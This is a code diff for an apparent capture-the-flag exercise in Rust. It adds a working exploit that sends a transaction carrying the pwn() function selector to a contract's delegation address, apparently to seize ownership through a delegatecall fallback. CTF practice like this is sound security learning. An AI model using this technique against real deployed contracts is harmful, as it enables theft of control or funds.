@@ -28,6 +28,13 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let tx = TransactionRequest::new()
+            .to(target.delegation_address)
+            .gas(U256::from(10_000_000))
+            .data(keccak256("pwn()").into_iter().take(4).collect::<Vec<u8>>());
+
+        offender.send_transaction(tx, None).await?.await?;
+
         Ok(())
     }
 }
